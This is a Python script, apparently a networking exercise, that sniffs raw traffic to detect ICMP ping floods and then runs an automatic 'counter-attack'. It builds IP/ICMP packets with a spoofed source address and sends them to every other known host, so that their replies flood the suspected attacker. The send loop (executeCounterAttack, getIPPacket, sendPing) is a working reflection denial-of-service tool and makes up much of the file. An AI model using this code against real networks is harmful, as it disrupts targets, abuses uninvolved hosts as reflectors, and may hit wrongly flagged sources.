from datetime import datetime as dt
import socket
import sys
import struct
import math
import os


# DEFS
ETH_P_ALL = 0x0003
ETH_P_SIZE = 65536
ETH_P_IP = 0x0800
IP_PROTO_ICMP = 1

ATTACK_TIME = 5
KNOWN_HOSTS = {}
ip_dictionary = dict({})


def bytes_to_mac(bytes_mac):
    return ":".join("{:02x}".format(x) for x in bytes_mac)


def addFoundIP(ip: str, mac: str = '') -> bool:
    if ip not in ip_dictionary.keys():
        ip_dictionary[ip] = dict({
            'pktIntervalSec': math.inf,
            'attackPktsCount': 0,
            'MAC': mac,
        })

        print('MAC:', bytes_to_mac(eth[1]))
        print('IP:', source_address)
        return True
    return False


def createSocket():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
        print('Debug: Socket created')
        s.bind(('eth0', 0))
        return s

    except OSError as message:
        print('Error: ' + str(message))
        sys.exit(1)


def receivePacket(ip: str):
    now = dt.now()
    if 'lastPacketAt' not in ip_dictionary[ip].keys():
        ip_dictionary[ip]['lastPacketAt'] = now
        return

    packet_inteval_dt = now - ip_dictionary[ip]['lastPacketAt']
    ip_dictionary[ip]['pktIntervalSec'] = packet_inteval_dt.total_seconds()
    ip_dictionary[ip]['lastPacketAt'] = now


def getPacketInterval(ip: str) -> float:
    if 'pktIntervalSec' not in ip_dictionary[ip].keys():
        ip_dictionary[ip]['pktIntervalSec'] = math.inf
    return ip_dictionary[ip]['pktIntervalSec']

def isPingFloodAttack(ip: str, interval: float) -> bool:

    ATTACK_PKTCOUNT_THRESHOLD = 10
    ATTACK_PKTINTERVAL_THRESHOLD = 0.01

    # if the property was not initialized, initialize
    if 'attackPktsCount' not in ip_dictionary[ip].keys():
        ip_dictionary[ip]['attackPktsCount'] = 0
        return False

    # if the interval of the packets is less than the threshold, then is an attack
    if interval < ATTACK_PKTINTERVAL_THRESHOLD:
        ip_dictionary[ip]['attackPktsCount'] += 1

    # if the source overlaps the max attack pkt count, counter attack
    if ip_dictionary[ip]['attackPktsCount'] >= ATTACK_PKTCOUNT_THRESHOLD:
        return True

    return False


def printInfo():
    for ip in ip_dictionary.keys():
        pktInterval = 0
        lastPacketAt = 0
        attackPktsCount = 0
        mac = ''
        if 'pktIntervalSec' in ip_dictionary[ip].keys():
            pktInterval = ip_dictionary[ip]['pktIntervalSec']
        if 'lastPacketAt' in ip_dictionary[ip].keys():
            lastPacketAt = ip_dictionary[ip]['lastPacketAt']
        if 'attackPktsCount' in ip_dictionary[ip].keys():
            attackPktsCount = ip_dictionary[ip]['attackPktsCount']
        if 'MAC' in ip_dictionary[ip].keys():
            mac = ip_dictionary[ip]['MAC']
        print('IP:', ip,
              '\tMAC', mac,
              '\tPkt Interval:', pktInterval,
              '\tLastPktAt:', lastPacketAt,
              '\tAttackPkts:', attackPktsCount)


# ------------------------ Ping flood ------------------------

def getBotnetList(ip_attack: str) -> list:
    botnet_ls = []

    for ip in ip_dictionary.keys():
        if ip == ip_attack:
            continue
        item = dict({
            'ip_dest': ip,
            'mac_dest': ip_dictionary[ip]['MAC'],
        })
        botnet_ls.append(item)

    return botnet_ls


def executeCounterAttack(ip_attack: str, max_sec: int):
    start_time = dt.now()

    botnet_ls = getBotnetList(ip_attack)
    stats = [0 for _ in range(len(botnet_ls))]

    info_time = dt.now()

    while True:
        exec_elapsed_sec = (dt.now() - start_time).total_seconds()

        info_elapsed = (dt.now() - info_time).total_seconds()
        if info_elapsed >= 1:
            info_time = dt.now()

        if exec_elapsed_sec >= max_sec:
            break

        for i in range(len(botnet_ls)):
            bot = botnet_ls[i]
            s = getSocket(None, socket.getprotobyname('icmp'))
            sendPing(s, ip_attack, bot['ip_dest'])
            s.close()
            # inc the qty of ping sent
            stats[i] += 1

    print('Bot list:', botnet_ls)
    print('Stats:', stats)
    print('flooding done')


# ------------------------ End of Ping flood ------------------------

# ------------------------ Send Ping ------------------------

def getChecksum(msg: bytes) -> int:
    s = 0
    msg = (msg + b'\x00') if len(msg) % 2 else msg
    for i in range(0, len(msg), 2):
        w = msg[i] + (msg[i+1] << 8)
        s = s + w
        s = (s & 0xffff) + (s >> 16)
    s = ~s & 0xffff
    return socket.ntohs(s)


def getIcmpRequestHeader():
    header = dict({
        'type': 8,
        'code': 0,
        'checksum': 0,
        'id': 12345,
        'seqnumber': 0,
        'payload': bytes('ª{!"#$%&\'()*+,-./01234567', 'utf8'),
    })
    return header


def getIcmpPacket() -> bytes:
    icmp_header_props = getIcmpRequestHeader()
    icmp_h = struct.pack(
        '!BBHHH',
        icmp_header_props['type'],
        icmp_header_props['code'],
        icmp_header_props['checksum'],
        icmp_header_props['id'],
        icmp_header_props['seqnumber'],
    )

    padBytes = []
    startVal = 0x42
    for i in range(startVal, startVal + 55):
        padBytes += [(i & 0xff)]  # Keep chars in the 0-255 range
    data = bytes(padBytes)

    checksum = getChecksum(icmp_h + data)

    icmp_h = struct.pack(
        '!BBHHH',
        icmp_header_props['type'],
        icmp_header_props['code'],
        checksum,
        icmp_header_props['id'],
        icmp_header_props['seqnumber'],
    )
    icmp_pkt = icmp_h + data

    return icmp_pkt


def getIPPacket(ip_source: str, ip_dest: str) -> bytes:
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_total_len = 0
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0
    ip_saddr = socket.inet_aton(ip_source)
    ip_daddr = socket.inet_aton(ip_dest)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_h = struct.pack(
        '!BBHHHBBH4s4s',
        ip_ihl_ver,
        ip_tos,
        ip_total_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr,
    )

    return ip_h




def sendPing(s: socket.socket, ip_source: str, ip_dest: str):
    icmp_pkt = getIcmpPacket()
    ip_h = getIPPacket(ip_source, ip_dest)

    dest_addr = socket.gethostbyname(ip_dest)
    s.sendto(ip_h + icmp_pkt, (dest_addr, 0))



def getSocket(if_net: str, proto: int = socket.ntohs(ETH_P_ALL)) -> socket:
    try:
        s = None

        if proto == socket.getprotobyname('icmp'):
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                              proto)
            # print('icmp socket created!')
        else:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                              proto)
            # print('eth socket created!')
    except OSError as msg:
        print('failed to create socket', str(msg))
        sys.exit(1)

    if proto == socket.getprotobyname('icmp'):
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    else:
        s.bind((if_net, 0))

    return s






if __name__ == "__main__":
    sock = createSocket()
    socket_name = sock.getsockname()
    mac_addr = socket_name[-1]

    print('MAC addr: + ' + bytes_to_mac(mac_addr))

    while True:
        (packet, addr) = sock.recvfrom(65536)
        eth_length = 14
        eth_header = packet[:14]
        eth = struct.unpack('!6s6sH', eth_header)
        packet_type = eth[2]

        if packet_type == ETH_P_IP:
            print("IP Packet")
            ip_header = packet[eth_length:20 + eth_length]
            iph = struct.unpack("!BBHHHBBH4s4s", ip_header)

            version_ihl = iph[0]
            version = version_ihl >> 4
            ihl = version_ihl & 0xF
            iph_length = ihl * 4
            ttl = iph[5]

            source_address = socket.inet_ntoa(iph[8])
            destiny_address = socket.inet_ntoa(iph[9])
            print("IP Src: " + source_address)
            print("IP Dst: " + destiny_address)

            protocol = iph[6]

            if protocol == 1 :
                print("ICMP Packet")
                icmp_header = packet[iph_length + eth_length:]
                icmph = struct.unpack("BBHHH%ds" % (len(icmp_header) - 8), icmp_header)
                icmp_type = icmph[0]
                icmp_code = icmph[1]
                icmp_id = icmph[2]
                icmp_seq = icmph[3]
                icmp_payload = icmph[4]

                print("Type: ", icmp_type)
                print("Code: ", icmp_code)

                if icmp_type == 8 and icmp_code == 0 :
                    print("Echo Request")
                    addFoundIP(source_address, bytes_to_mac(eth[1]))

                    receivePacket(source_address)

                    pInterval = getPacketInterval(source_address)

                    if isPingFloodAttack(source_address, pInterval):
                        printInfo()
                        executeCounterAttack(source_address, ATTACK_TIME)


                #if icmp_type == 0 and icmp_code == 0 :
                    #print("Echo Reply")










